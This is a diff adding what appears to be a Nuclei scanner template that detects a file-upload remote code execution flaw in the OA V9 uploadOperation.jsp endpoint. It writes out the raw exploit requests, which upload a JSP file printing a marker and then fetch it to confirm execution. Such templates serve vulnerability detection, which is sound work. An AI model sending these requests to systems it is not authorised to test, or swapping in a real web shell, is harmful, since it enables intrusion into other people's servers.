@@ -1,0 +1,37 @@
+id: oa-v9-uploads-file
+
+info:
+  name: OA V9 RCE via File Upload
+  author: pikpikcu
+  severity: high
+  description: A vulnerability in OA V9 uploadOperation.jsp endpoint allows remote attackers to upload arbitrary files to the server. These files can be subsequently called and are executed by the remote software.
+  reference:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+  tags: rce,jsp,fileupload,intrusive
+
+requests:
+  - raw:
+      - |
+        POST /page/exportImport/uploadOperation.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+
+        ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+        Content-Disposition: form-data; name="file"; filename="poc.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print(2be8e556fee1a876f10fa086979b8c7c);%>
+        ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+
+      - |
+        GET /page/exportImport/fileTransfer/poc.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "2be8e556fee1a876f10fa086979b8c7c")'
+          - 'status_code_2 == 200'
+        condition: and
